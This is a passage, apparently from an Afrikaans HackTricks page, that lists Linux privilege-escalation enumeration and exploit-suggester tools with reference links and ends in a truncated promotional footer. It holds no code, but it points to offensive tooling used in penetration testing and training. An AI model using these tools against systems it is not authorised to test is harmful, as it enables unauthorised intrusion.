### **Die beste hulpmiddel om te soek na Linux plaaslike voorregverhogingsvektore:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opsie)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumereer kernelkwetsbaarhede in Linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Versameling van meer skrips**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Verwysings

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RU
